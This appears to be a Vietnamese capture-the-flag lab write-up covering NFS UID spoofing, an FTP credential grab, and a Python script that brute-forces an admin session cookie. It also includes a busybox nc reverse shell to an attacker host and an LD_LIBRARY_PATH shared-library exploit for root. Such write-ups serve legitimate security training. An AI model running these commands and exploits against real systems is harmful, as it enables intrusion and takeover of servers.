<img width="2053" height="1115" alt="image" src="https://github.com/user-attachments/assets/9b428cdc-77f2-464f-98fb-4ac97dc3b5da" />

khi quét bạn sẽ thấy các cổng chứa data như là ftp, nfs

để vào đọc file nfs thì mình có thể mount về máy sau đó fake uid user: `sudo mount -t nfs <IP>:/mnt/share /tmp/nfs`; `sudo useradd -u 1003 temp_user && sudo su temp_user`

<img width="1781" height="995" alt="image" src="https://github.com/user-attachments/assets/4773c707-f501-4adb-9e4b-01699e0a666b" />

vậy là đã biết được username:password của ftp, để lấy file về và đọc bạn cần phải tạo thêm một user với uid là 1002

<img width="1860" height="1133" alt="image" src="https://github.com/user-attachments/assets/14e3f963-a580-44af-b2d7-c0b7689045ce" />

bạn có thể sài script này để brute-force PHPSESSID của user admin

```
import hashlib
import base64
import requests
import sys

# Đã cập nhật IP mới của bạn
target_url = "http://<IP>/administration.php"

# Đã trỏ tới file danh sách mật khẩu bạn vừa lấy từ FTP
wordlist_path = ".passwords_list.txt"

print(f"[*] Đang kết nối tới: {target_url}")
print(f"[*] Đang nạp danh sách mật khẩu từ: {wordlist_path}\n")

try:
    # 1. Gửi request sai để lấy chiều dài trang báo lỗi (Baseline)
    print("[*] Đang đo đạc giao diện trang lỗi...")
    baseline_response = requests.get(target_url, cookies={'PHPSESSID': 'wrong_cookie_123'})
    error_length = len(baseline_response.text)
    print(f"[*] Độ dài trang khi bị từ chối: {error_length} ký tự\n")
    print("[*] Bắt đầu tấn công Brute-force...")

    with open(wordlist_path, "r", encoding="utf-8") as f:
        for line in f:
            password = line.strip()
            if not password: 
                continue # Bỏ qua dòng trống
            
            # 2. Băm MD5 mật khẩu
            md5_hash = hashlib.md5(password.encode()).hexdigest()
            
            # 3. Ghép chuỗi admin:md5 và mã hóa Base64
            raw_auth = f"admin:{md5_hash}"
            cookie_value = base64.b64encode(raw_auth.encode()).decode()
            
            try:
                # 4. Gửi request với cookie giả mạo
                response = requests.get(target_url, cookies={'PHPSESSID': cookie_value})
                current_length = len(response.text)
                
                # 5. So sánh: Nếu độ dài khác trang lỗi -> Thành công!
                if current_length != error_length:
                    print(f"\n" + "="*40)
                    print(f"[+] BINGO! ĐÃ TÌM THẤY COOKIE ADMIN!")
                    print(f"[+] Mật khẩu thật: {password}")
                    print(f"[+] Cookie (PHPSESSID): {cookie_value}")
                    print(f"="*40)
                    break
            except requests.exceptions.RequestException:
                # Bỏ qua nếu có lỗi mạng chập chờn
                continue
                
            print(f"[-] Đang thử: {password}", end="\r")

except FileNotFoundError:
    print(f"\n[!] LỖI: Không tìm thấy file '{wordlist_path}'.")
    print("[!] Hãy chắc chắn rằng bạn đã lưu danh sách mật khẩu vào file 'passwords.txt' nằm CÙNG THƯ MỤC với script này.")
except Exception as e:
    print(f"\n[!] Có lỗi xảy ra: {e}")
```
sau khi vô được trang admin rồi thì bạn có thể sài lệnh này để RCE lên server

```$(busybox nc <ATTACKER_IP> 4444 -e /bin/bash)```

mình sẽ tìm được password của rick ở folder sau đây:

<img width="1690" height="827" alt="image" src="https://github.com/user-attachments/assets/a6710bfc-a78f-4335-a970-d3ddf6471d94" />

đăng nhập vào rick, đọc user flag và sử dụng `sudo -l` xem có thể leo quyền bằng cách nào không

<img width="2352" height="761" alt="image" src="https://github.com/user-attachments/assets/3234eee9-afce-479d-8f06-4ce8365b5e4d" />

ở đây mình có thể lợi dụng lỗ hổng thư viện `env_keep+=LD_LIBRARY_PATH` để leo root

tạo script này ở /tmp 
```
cat << 'EOF' > /tmp/exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void inject() __attribute__((constructor));

void inject() {
    setuid(0);
    system("/bin/bash -p");
}
EOF
```

sau đó biên dịch nó thành thành file thư viện .so

`gcc -fPIC -shared -o /tmp/libcrypt.so.1 /tmp/exploit.c -nostartfiles`

rồi thực thi nó 

`sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2`

và cuối cùng đã lên được root 

<img width="1151" height="569" alt="image" src="https://github.com/user-attachments/assets/1823eac4-92e1-4633-b1d0-afe880eee4e3" />



